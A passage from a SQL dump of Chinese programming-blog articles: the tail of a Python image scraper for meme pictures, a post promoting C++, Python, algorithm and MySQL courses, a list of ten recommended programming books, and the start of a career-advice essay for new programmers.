punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">break</span>\n        url <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>page_queue<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>parse_page<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">parse_page</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text\n        <span class=\"token comment\"># print(response)</span>\n        html <span class=\"token operator\">=</span> etree<span class=\"token punctuation\">.</span>HTML<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span>\n        images <span class=\"token operator\">=</span> html<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'//div[@class=\"random_picture\"]\'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> img <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span>\n            img_url <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'.//img/@data-original\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\"># 获取图片名字</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>img_url<span class=\"token punctuation\">)</span>\n            alt <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'.//p/text()\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> name<span class=\"token punctuation\">,</span> new_url <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>alt<span class=\"token punctuation\">,</span> img_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                filename <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token string\">r\'[?？.，。！!*\\\\/|]\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'\'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".jpg\"</span>\n                <span class=\"token comment\"># 获取图片的后缀名</span>\n                <span class=\"token comment\"># suffix = os.path.splitext(img_url)[1]</span>\n                <span class=\"token comment\"># print(alt)</span>\n                self<span class=\"token punctuation\">.</span>img_queue<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>new_url<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Download</span><span class=\"token punctuation\">(</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> page_queue<span class=\"token punctuation\">,</span> img_queue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>Download<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>page_queue <span class=\"token operator\">=</span> page_queue\n        self<span class=\"token punctuation\">.</span>img_queue <span class=\"token operator\">=</span> img_queue\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>img_queue<span class=\"token punctuation\">.</span>empty<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> self<span class=\"token punctuation\">.</span>page_queue<span class=\"token punctuation\">.</span>empty<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">break</span>\n        img_url<span class=\"token punctuation\">,</span> filename <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>img_queue<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"表情包/\"</span> <span class=\"token operator\">+</span> filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n            response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>img_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content\n            f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>filename <span class=\"token operator\">+</span> <span class=\"token string\">\'下载完成\'</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 建立队列</span>\n    page_q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    img_q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string\">\'https://www.doutula.com/search?type=photo&amp;more=1&amp;keyword=%E7%A8%8B%E5%BA%8F%E5%91%98&amp;page={}\'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n        page_q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        t <span class=\"token operator\">=</span> ImageParse<span class=\"token punctuation\">(</span>page_q<span class=\"token punctuation\">,</span> img_q<span class=\"token punctuation\">)</span>\n        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        t <span class=\"token operator\">=</span> Download<span class=\"token punctuation\">(</span>page_q<span class=\"token punctuation\">,</span> img_q<span class=\"token punctuation\">)</span>\n        t<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\'__main__\'</span><span class=\"token punctuation\">:</span>\n    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p><em><strong>PS：表情包在手，聊天永不尬，没什么事是一个表情包解决不了的，如果有那就多发几个！对你有用的话给辣条一个三连吧，感谢啦！</strong></em></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (87, 'CSDN粉丝冲3万粉福利放送！C++、Python、数据结构与算法、计算机基础、数据库教程汇总！', '<div id=\"content_views\" class=\"htmledit_views\"> \n <p>最近有粉丝问我要一些C++、Python、数据结构与算法、计算机基础、数据库的学习资料，一个一个回复有些慢，索性就写一篇文章吧！</p> \n <p>声明：此文章中涉及到的内容均来自网络，我看到比较好的才分享给大家，你们可以根据情况选择。</p> \n <p>&nbsp;</p> \n <p>第一篇：C++</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131212567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>&nbsp;</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131455771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>这里可以分为基础→进阶→提升，C++的基础概念，基础部分包含数据类型、运算符等基本语法，数组、指针、字符串等基本词法，循环、函数、类等基本句法等。进阶部分分为类的高级技术、类的继承、编译链接和命名空间等。提升部分有类型转换、文件操作、异常处理、代码重用等内容。</p> \n <p>&nbsp;</p> \n <p>如果你是初学C++或者提升自己技能，那是非常合适的，学完这个内容，可以再用我分享的60个案例练手。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131556461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3806\">征服C++ 11视频精讲</a></p> \n <p>&nbsp;</p> \n <p>第二篇：数据结构与算法</p> \n <p>&nbsp;</p> \n <p>俗话说，算法才是编程的灵魂！无论C、C++、 Java还是Python，想要提升都要跨过算法这个门槛，同样算法也是找工作面试时的常考方向。</p> \n <p>假设需要从众多数据中查找出符合要求的元素，美学没学习数据结构的话，只能借助数组这种简单的存储结构来实现，而通过学习数据结构，解决此类问题既可以通过构建二叉排序树、平衡二叉树、红黑树、B+/B- 树甚至借助哈希表解决。不同数据结构选择往往直接影响程序性能好坏。</p> \n <p>掌握了数据结构与算法，看待问题的深度、解决问题的角度会大有不同，对于个人逻辑思维的提升，也是质的飞跃。与编程语言不同，无论是 c语言、Java、Python、C++、PHP 还是其他编程语言，无时无刻不在更新迭代，而数据结构却永远不会过时，毋庸置疑，数据结构是每个程序员必须掌握的基本功。</p> \n <p>这门教程采用了动画的形式把难懂的算法知识形象的讲解出来，并拆解了各大厂的高频算法面试题，我是强烈推荐给你这个教程哦~</p> \n <p>&nbsp;</p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3795\">图解数据结构与算法</a></p> \n <p>&nbsp;</p> \n <p>第三篇：计算机基础</p> \n <p>&nbsp;</p> \n <p>很多粉丝会遇到这样的问题：语法学得挺溜，校招要求写“银行家算法”的实现，却一点也写不出来。出现这个问题的原因是什么？是计算机基础没学好！</p> \n <p>强烈建议你如果计算机基础没学好的，可以通过这个教程快速复习一下。这里涵盖了三大计算机基础知识全解。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131706692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3800\">编程必备基础 计算机组成原理+操作系统+计算机网络</a></p> \n <p>&nbsp;</p> \n <p>第四篇：MySQL数据库</p> \n <p>&nbsp;</p> \n <p>毫不夸张的说，MySQL是每一个程序员都应该掌握的，无论你是用的那种开发语言。学习编程，你可能会犹豫选择 C++ 还是 Java；入门数据科学，你可能会纠结于选择 Python 还是 R；但无论如何， MySQL 都是 IT 从业人员不可或缺的技能！</p> \n <p>当然，MySQL也是面试常考选项了，网上有很多大厂面试题都有提到MySQL，还有很多培训机构专门开设了MySQL的训练营。</p> \n <p>在这个教程中，你可以从配置MySQL入门学起，学会SQL中数据查询语言DQL、数据操纵语言DML、数据定义语言DDL、数据控制语言DCL，学会熟练对库表进行增删改查等必备技能。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131756545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3801\">MySQL数据库从入门到实战课</a></p> \n <p>&nbsp;</p> \n <p>第五篇：Python</p> \n <p>&nbsp;</p> \n <p>Python还是属于非常火的状态，看CSDN的热榜就知道了，很多Python领域的文章，火那就说明很多人想学，我也来给大家甄别了一些教程，在此推荐给你。</p> \n <p>&nbsp;</p> \n <p>1、Python入门</p> \n <p>这个教程是基于Python3讲解的，从基础技能到实际案例，并辅以练习演示、课后作业及社区答疑，对零基础的同学非常友好，包含内置对象和基本的运算、语句，并且在“函数”和“类”的学习中强化面向对象开发方式。学习后可独立完成小型程序开发。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131839608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3780\">零基础掌握 Python 入门到实战</a></p> \n <p>&nbsp;</p> \n <p>2、Python爬虫</p> \n <p>几乎所有Python程序员都会爬虫，爬虫和数据分析属于Python领域的两大分类了，这篇教程中把网络爬虫的三大基本步骤（网络请求、数据解析、数据存储）讲解的非常详细。还有反爬虫实践都有讲到，在爬虫过程中，我们经常容易遇到被反爬虫，比如字体反爬、IP识别、验证码等。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615131919458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3782\">150讲轻松搞定Python爬虫</a></p> \n <p>&nbsp;</p> \n <p>3、Python面试</p> \n <p>这个教程搜集了各大互联网公司的Python面试题以及类似的题目。包括Python语言本身的知识、Python SDK、Web、Python爬虫以及算法等内容。所以的源代码都使用Python3.x编写。Python相关知识包括基本语法、正则表达式、字符串、数据库、网络、Web等。算法包括了一些出镜率高的内容、如与链表、树、数组相关的算法。</p> \n <p>应对面试官应该是没有问题的。</p> \n <p style=\"text-align:center;\"><img alt=\"\" src=\"https://img-blog.csdnimg.cn/20210615132002589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTA1NTI2MA==,size_16,color_FFFFFF,t_70\"></p> \n <p>相关教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_41055260/e/3790\">Python 面试100讲（基于Python3.x）</a></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (88, '新手程序员必读的十本经典著作', '<div id=\"content_views\" class=\"markdown_views prism-tomorrow-night-eighties\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614224536610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 现如今的高收入行业中，互联网行业可以说是高薪行业了。可是许多人只看到程序员们可观的收入，却忽视了很重要的一点：在高速发展的IT行业，知识和技术更迭快，程序员们也需要不断的自我学习，丰富自己的理论知识，才能够在快速变化的行业环境中不被淘汰。<br> 于是，不断的学习便成了程序员的自我提升方式之一。下面，小编就为大家整理了一个程序员书单，希望能帮助每一个想提升自己的程序员伙伴。</p> \n <p>作为程序员呢，最终要的是技术，但是，在我看来，在读技术类的书籍之前，我们应当首先去读一些思想层面的书籍。这样，在未来的程序学习之中，我们才能事半功倍。<br> 首先我为大家推荐的就是《程序员的自我修养》这本书<br> <img src=\"https://img-blog.csdnimg.cn/20210614224512848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>这本书主要介绍系统软件的运行机制和原理，涉及在Windows和Linux两个系统平台上，一个应用程序在编译、链接和运行时刻所发生的各种事项，包括：代码指令是如何保存的，库文件如何与应用程序代码静态链接，应用程序如何被装载到内存中并开始运行，动态链接如何实现，C/C++运行库的工作原理，以及操作系统提供的系统服务是如何被调用的。每个技术专题都配备了大量图、表和代码实例，力求将复杂的机制以简洁的形式表达出来。本书最后还提供了一个小巧且跨平台的C/C++运行库MiniCRT，综合展示了与运行库相关的各种技术。小编一直认为这是每一个程序员都应该读的一本书。</p> \n <p>我为大家推荐的第二本书是《程序员修炼之道》，这也是本人最喜欢的一本书</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614224300938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 《程序员修炼之道》由一系列的独立的部分组成，涵盖的主题从个人责任、职业发展，直到用于使代码保持灵活、并且易于改编和复用的各种架构技术。利用许多富有娱乐性的奇闻轶事、有思想性的例子以及有趣的类比，全面阐释了软件开发的许多不同方面的最佳实践和重大陷阱。无论你是初学者，是有经验的程序员，还是软件项目经理，本书都适合你阅读。</p> \n <p>接下来的第三本书为大家推荐《计算机程序的构造与解释》第二版<br> <img src=\"https://img-blog.csdnimg.cn/20210614224346564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>《计算机程序的构造和解释(原书第2版)》1984年出版，成型于美国麻省理工学院(MIT)多年使用的一本教材，1996年修订为第2版。在过去的二十多年里，《计算机程序的构造和解释(原书第2版)》对于计算机科学的教育计划产生了深刻的影响。</p> \n <p>第2版中大部分重要程序设计系统都重新 修改并做过测试，包括各种解释器和编译器。作者根据其后十余年的教学实践，还对其他许多细节做了相应的修改。</p> \n <p>在了解了程序员自身的特性和计算机的运行原理以后，我们就应当开始学习如何去创造自己的第一个程序了。</p> \n <p>首先，介绍Java程序员必读的基本技术类的书籍</p> \n <p>第一本是李刚的《疯狂Java讲义》<br> <img src=\"https://img-blog.csdnimg.cn/20210614224403156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 《疯狂Java讲义（第3版）(含CD光盘1张)》深入介绍了Java编程的相关方面，全书内容覆盖了Java的基本语法结构、Java的面向对象特征、Java集合框架体系、Java泛型、异常处理、Java GUI编程、JDBC数据库编程、Java注释、Java的IO流体系、Java多线程编程、Java网络通信编程和Java反射机制。覆盖了java.lang、java.util、java.text、java.io和java.nio、java.sql、java.awt、javax.swing包下绝大部分类和接口。本书全面介绍了Java 8的新的接口语法、Lambda表达式、方法引用、构造器引用、函数式编程、流式编程、新的日期、时间API、并行支持、改进的类型推断、重复注解、JDBC 4.2新特性等新特性。</p> \n <p>在学会如何写Java程序以后，我希望大家能再从思想层面深入了解一下Java的灵魂，那么下边这本书《Java编程思想》就能很好的帮助大家了。<br> <img src=\"https://img-blog.csdnimg.cn/20210614224423220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 本书的作者拥有多年教学经验，对C、C++以及Java语言都有独到、深入的见解，以通俗易懂及小而直接的示例解释了一个个晦涩抽象的概念。本书共22章，包括操作符、控制执行流程、访问权限控制、复用类、多态、接口、通过异常处理错误、字符串、泛型、数组、容器深入研究、Java I/O系统、枚举类型、并发以及图形化用户界面等内容。这些丰富的内容，包含了Java语言基础语法以及高级特性，适合各个层次的Java程序员阅读，同时也是高等院校讲授面向对象程序设计语言以及Java语言的绝佳教材和参考书。</p> \n <p>下面再为Python学习者推荐一本小编特别喜欢的书《自学是门手艺》<br> <img src=\"https://img-blog.csdnimg.cn/2021061422444737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 没有自学能力的人没有未来。本书以自学Python编程为例，阐述了如何培养、习得自学能力，并运用自学能力在未来竞争激烈的社会中获得一席之地，不断地升级、进化，实现真正的成长。作为一本“硬核”的“鸡汤”书，本书不仅仅以纸质的形式呈现，还提供了XUE.cn互动学习平台。读者不仅可以通过阅读本书学到自学的方法，还能在XUE.cn上把这些方法付诸实践，不断练习、提升自己的技能，真正成为有积累、有前途的新新人类。祝愿所有与本书结缘的读者都有一个更美好的未来。本书不仅教会了大家如何去写Python程序，更重要的是教会了大家如何去培养自己的自学能力。<br> 当然，作为一本讲述自学的书学习Python是远远不够的，下面这本书可以帮助大家更好的学习Python，这本书就是《Python编程》<br> <img src=\"https://img-blog.csdnimg.cn/2021061422462233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 本书是一本针对所有层次的Python 读者而作的Python 入门书。全书分两部分：第一部分介绍用Python 编程所必须了解的基本概念，包括matplotlib、NumPy 和Pygal 等强大的Python 库和工具介绍，以及列表、字典、if 语句、类、文件与异常、代码测试等内容；第二部分将理论付诸实践，讲解如何开发三个项目，包括简单的Python 2D 游戏开发如何利用数据生成交互式的信息图，以及创建和定制简单的Web 应用，并帮读者解决常见编程问题和困惑。<br> 下面为大家介绍第八本书《编程珠玑》<br> 历史上伟大的计算机科学经典名著之一。<br> 融深邃思想、实战技术与趣味轶事于一炉的奇书。<br> 带你真正领略计算机科学之美。<br> <img src=\"https://img-blog.csdnimg.cn/20210614224647890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 本书是计算机科学方面的经典名著。书的内容围绕程序设计人员面对的一系列实际问题展开。作者Jon Bentley 以其独有的洞察力和创造力，引导读者理解这些问题并学会解决方法，而这些正是程序员实际编程生涯中至关重要的。本书的特色是通过一些精心设计的有趣而又颇具指导意义的程序，对实用程序设计技巧及基本设计原则进行了透彻而睿智的描述，为复杂的编程问题提供了清晰而完备的解决思路。本书对各个层次的程序员都具有很高的阅读价值。<br> 另外一本书同样是小编很喜欢的一本书，第一次读，是因为被它的名字吸引<br> “此书将迫使你重新思考计算机编程的本质。”<br> 这本书不仅仅适合程序员，一切对计算机行业感兴趣的读者。<br> 为什么书呆子不受欢迎？他们的心思在别的地方。<br> 黑客也是创造者，与画家、建筑师、作家一样。<br> 这本书就是《黑客与画家》<br> <img src=\"https://img-blog.csdnimg.cn/20210614224913575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 本书是硅谷创业之父Paul Graham 的文集，主要介绍黑客即优秀程序员的爱好和动机，讨论黑客成长、黑客对世界的贡献以及编程语言和黑客工作方法等所有对计算机时代感兴趣的人的一些话题。书中的内容不但有助于了解计算机编程的本质、互联网行业的规则，还会帮助读者了解我们这个时代，迫使读者独立思考。<br> 本书适合所有程序员和互联网创业者，也适合一切对计算机行业感兴趣的读者。<br> 最后一本书是一本可以从程序员视角全面剖析的实现细节，使读者深刻理解程序的行为，将所有计算机系统的相关知识融会贯通的书——《深入理解计算机系统》<br> <img src=\"https://img-blog.csdnimg.cn/20210614224716693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTI5NzI4Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>本书从程序员的视角详细阐述计算机系统的本质概念，并展示这些概念如何实实在在地影响应用程序的正确性、性能和实用性。<br> 全书共12章，主要内容包括信息的表示和处理、程序的机器级表示、处理器体系结构、优化程序性能、存储器层次结构、链接、异常控制流、虚拟存储器、系统级I/O、网络编程、并发编程等。书中提供大量的例子和练习，并给出部分答案，有助于读者加深对正文所述概念和知识的理解。<br> 本书的最大优点是为程序员描述计算机系统的实现细节，帮助其在大脑中构造一个层次型的计算机系统，从最底层的数据在内存中的表示到流水线指令的构成，到虚拟存储器，到编译系统，到动态加载库，到最后的用户态应用。通过掌握程序是如何映射到系统上，以及程序是如何执行的，读者能够更好地理解程序的行为为什么是这样的，以及效率低下是如何造成的。</p> \n <p>希望大家能广泛涉猎，努力进去，成为那个不可替代的软件工程师。</p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (89, '内卷大环境之下，萌新程序员该如何化解？', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>随着互联网的快速发展，程序员在行业内还是比较热门的，但程序员行业是一个竞争激烈的行业，如何在技术不断更新的情况下长久发展下去？</p> \n <p>说实在话，刚开始我进行业的时候，对自己以后的发展也是一头雾水，让我有感触的是这两年的坚持学习，有自己的学习时间，基于此给新入坑的程序员一点建议。主要是给那些萌新的程序员，以及想要转行做程序员的朋友们给一些建议。主要是阐述两个问题以及针对问题提出的建议：</p> \n <p>1.要不要做程序员?</p> \n <p>2.如果你已经做了一个程序员，如何从一个萌新进阶成为一个合格的打工人？</p> \n <p>3.IT技术正确的学习方法</p> \n <p>4.避免内卷化</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615195914350.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1bGkxMDI0,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h2><a id=\"_16\"></a>一、要不要做程序员</h2> \n <p>我是2015年本科毕业，大学学的是计算机科学与技术，当时主修的编程语言是Java，刚毕业的时候做个一段时间的软件工程实习生。后来考研，对Python比较感兴趣，所以就学习了Python。那么到现在为止的话工作不到五年，目前是在一家小厂做后端开发的一些工作。</p> \n <p>我也将探讨一下作为一个小厂的员工。程序员应该如何能够快速的积累知识和财富。</p> \n <p>先来讨论第一个问题，那就是要不要做程序员？我听说过这么一个说法，就是说在当前这个社会，能改变普通人命运的话有这么几条路可以走。</p> \n <p>第一条路叫敲代码，<br> 第二条路叫搞金融，<br> 第三叫在金融界敲代码，<br> 第四条路叫在代码界搞金融。</p> \n <p>仔细分析一下会发现话糙理不糙，其实就两条路，无非就是敲代码和搞金融。我认为这种说法的话虽然有点片面，但是也部分的能反映当前社会的现状，绝大部分的高薪职位都来自金融业或者IT领域。</p> \n <p>其实大多数年轻人都投身到了IT行业，这里面有本科计算机的科班生，也有那种半路出家的跨界选手。目前程序员的人才市场领域可以说是鱼龙混杂、参差不齐。</p> \n 